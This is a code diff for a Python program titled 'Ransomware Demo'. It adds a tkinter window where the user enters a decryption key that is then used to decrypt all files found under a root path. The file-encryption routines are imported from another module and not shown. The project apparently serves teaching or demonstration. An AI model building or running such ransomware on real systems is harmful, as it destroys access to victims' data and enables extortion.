@@ -3,6 +3,7 @@ import os
 from cryptography.fernet import Fernet
 from core import encrypt_symmetric_key, find_files, encrypt_file, decrypt_file, load_key_from_file
 from tkinter import *
+import tkinter as tk
 
 if __name__ == "__main__":
 
@@ -57,15 +58,27 @@ if __name__ == "__main__":
     # show gui
     window = Tk()
     window.title("Ransomware Demo")
+
+    label = tk.Label(window, text="Decryption key")
+    label.pack()
+
+    entry = tk.Entry(window, width=50)
+    entry.pack()
+
+    def get_textbox():
+        # load the key
+        key = entry.get()
+        print("Value from text box:", key)
+        l_key = key
+
+        # decrypt all files that were encrypted
+        files = find_files(os_root_path)
+        for file in files:
+            print(f"decrypted {file}")
+            decrypt_file(file, l_key)
+
+    button = tk.Button(window, text="Decrypt", command=get_textbox)
+    button.pack()
+
+
     window.mainloop()
-
-    # def handleButtonPress(key):
-    #     # load the key
-    #     print("Value from text box:", key)
-    #     l_key = key
-
-    #     # decrypt all files that were encrypted
-    #     files = find_files(os_root_path)
-    #     for file in files:
-    #         print(f"decrypted {file}")
-    #         decrypt_file(file, l_key)
